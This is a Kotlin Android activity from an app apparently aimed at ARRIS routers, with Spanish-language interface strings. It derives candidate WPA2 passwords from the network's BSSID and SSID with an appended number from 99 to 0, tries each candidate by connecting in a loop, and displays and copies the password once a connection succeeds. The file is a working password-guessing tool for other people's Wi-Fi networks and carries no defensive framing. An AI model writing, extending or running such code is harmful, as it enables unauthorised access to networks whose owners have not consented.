package com.example.wi_fi.ui.theme

import android.content.ClipboardManager
import android.content.Context
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.wifi.WifiConfiguration
import android.net.wifi.WifiNetworkSpecifier
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.widget.ImageButton
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.example.wi_fi.R

class arrisWifiDetailsActivity : AppCompatActivity() {
    private val TAG = "WifiUtils"
    private lateinit var ssid: String
    private lateinit var bssid: String
    private var connectionAttempts = 0
    private lateinit var passwordList: List<String>
    private lateinit var lastPassword: String

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.arris_activity_wifi_details)

        val ssidTextView: TextView = findViewById(R.id.arrisssidTextView)
        val passwordTextView: TextView = findViewById(R.id.arrispasswordTextView)

        val intent = intent
        if (intent != null) {
            ssid = intent.getStringExtra("SSID") ?: ""
            bssid = intent.getStringExtra("BSSID") ?: ""
            lastPassword = intent.getStringExtra("PASSWORD") ?: ""

            ssidTextView.text = "NOMBRE (SSID): $ssid"
            passwordTextView.text = "CONTRASEÑA: $lastPassword"
        }

        val ssidLayout: LinearLayout = findViewById(R.id.ssidLayout)
        val passwordLayout: LinearLayout = findViewById(R.id.passwordLayout)
        val connectButton: ImageButton = findViewById(R.id.connectButton)

        ssidLayout.setOnClickListener {
            copyToClipboard(ssidTextView.text.toString(), "SSID")
        }

        passwordLayout.setOnClickListener {
            copyToClipboard(passwordTextView.text.toString(), "Contraseña")
        }

        connectButton.setOnClickListener {
            generatePasswordsList()
            tryNextPassword()
        }

        val backButton: ImageButton = findViewById(R.id.arrisbackButton)
        backButton.setOnClickListener {
            finish()
        }
    }

    private fun copyToClipboard(text: String, label: String) {
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val cleanedText = text.substringAfter(": ").trim()
        val clip = android.content.ClipData.newPlainText("Copied Text", cleanedText)
        clipboard.setPrimaryClip(clip)
        Toast.makeText(this, "$label copiado", Toast.LENGTH_SHORT).show()
    }

    private fun generatePasswordsList() {
        val decimalRange = (99 downTo 0).toList()
        passwordList = decimalRange.map { it.toString() }
    }

    private fun tryNextPassword() {
        if (connectionAttempts < passwordList.size) {
            val password = getPassword(ssid, bssid, passwordList[connectionAttempts])
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                connectToWifi(ssid, password)
            } else {
                connectToWifiLegacy(ssid, password)
            }

            connectionAttempts++
        } else {
            // Se han probado todas las contraseñas de la lista
            showPasswordNotFoundDialog()
        }
    }

    private fun showPasswordNotFoundDialog() {
        val dialogBuilder = AlertDialog.Builder(this)
        dialogBuilder.setTitle("Contraseña no encontrada")
        dialogBuilder.setMessage("Se han probado todas las contraseñas de la lista. ¿Desea probar con la siguiente contraseña?")
        dialogBuilder.setPositiveButton("Sí") { dialog, _ ->
            dialog.dismiss()
            tryNextPassword()
        }
        dialogBuilder.setNegativeButton("No") { dialog, _ ->
            dialog.dismiss()
            finish()
        }
        val dialog = dialogBuilder.create()
        dialog.show()
    }

    @RequiresApi(Build.VERSION_CODES.Q)
    private fun connectToWifi(ssid: String, password: String) {
        val specifier = WifiNetworkSpecifier.Builder()
            .setSsid(ssid)
            .setWpa2Passphrase(password)
            .build()

        val request = NetworkRequest.Builder()
            .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
            .setNetworkSpecifier(specifier)
            .build()

        val connectivityManager =
            getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        connectivityManager.requestNetwork(request, object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                super.onAvailable(network)
                // Acciones cuando se establece la conexión exitosamente
                runOnUiThread {
                    Toast.makeText(this@arrisWifiDetailsActivity, "Conexión exitosa", Toast.LENGTH_SHORT).show()

                    val dialogView = LayoutInflater.from(this@arrisWifiDetailsActivity).inflate(R.layout.connected_password_dialog, null)
                    val passwordTextView: TextView = dialogView.findViewById(R.id.passwordTextView)
                    passwordTextView.text = password

                    val dialogBuilder = AlertDialog.Builder(this@arrisWifiDetailsActivity)
                        .setTitle("Conectado")
                        .setView(dialogView)
                        .setPositiveButton("Copiar") { _, _ ->
                            copyToClipboard(password, "Contraseña: ")
                            Toast.makeText(this@arrisWifiDetailsActivity, "Contraseña copiada al portapapeles", Toast.LENGTH_SHORT).show()
                        }
                        .setNegativeButton("Cerrar") { dialog, _ ->
                            dialog.dismiss()
                        }

                    val dialog = dialogBuilder.create()
                    dialog.show()
                }
            }

            override fun onUnavailable() {
                super.onUnavailable()
                // Acciones cuando la conexión no está disponible
                Toast.makeText(this@arrisWifiDetailsActivity, "Conexión no disponible", Toast.LENGTH_SHORT).show()
                tryNextPassword()
            }
        })

        // Registra la contraseña utilizada en el logcat
        Log.d(TAG, "Se está intentando utilizar la contraseña: $password para conectarse a la red $ssid")
    }


    private fun connectToWifiLegacy(ssid: String, password: String) {
        val wifiConfiguration = WifiConfiguration()
        wifiConfiguration.SSID = "\"$ssid\""
        wifiConfiguration.preSharedKey = "\"$password\""

        val wifiManager =
            applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
        val networkId = wifiManager.addNetwork(wifiConfiguration)

        if (networkId != -1) {
            wifiManager.enableNetwork(networkId, true)
            wifiManager.reconnect()
            Toast.makeText(this, "Intentando conectar a la red WiFi", Toast.LENGTH_SHORT).show()
        } else {
            Toast.makeText(this, "Error al agregar la configuración de red WiFi", Toast.LENGTH_SHORT).show()
            tryNextPassword()
        }

        // Registra la contraseña utilizada en el logcat
        Log.d(TAG, "Se está intentando utilizar la contraseña: $password para conectarse a la red $ssid")
    }

    private fun getPassword(ssid: String, bssid: String, password: String): String {
        val bssidDigits = bssid.replace(":", "").substring(0, 6).toUpperCase()
        val ssidDigits = ssid.replace("-", "").replace(".", "").substring(5, 9).toUpperCase()
        return "$bssidDigits$password$ssidDigits"
    }
}
